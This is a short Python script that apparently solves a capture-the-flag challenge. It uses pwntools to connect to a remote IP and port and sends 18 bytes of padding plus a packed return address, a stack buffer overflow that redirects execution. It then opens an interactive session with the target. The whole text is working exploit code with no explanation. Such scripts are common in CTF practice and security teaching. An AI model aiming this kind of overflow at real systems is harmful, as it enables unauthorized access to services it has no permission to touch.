from pwn import p64, remote

p = remote("34.170.146.252", 59419)
payload = b"A" * 18 + p64(0x401186)

p.sendafter(b"input:", payload)
p.interactive()
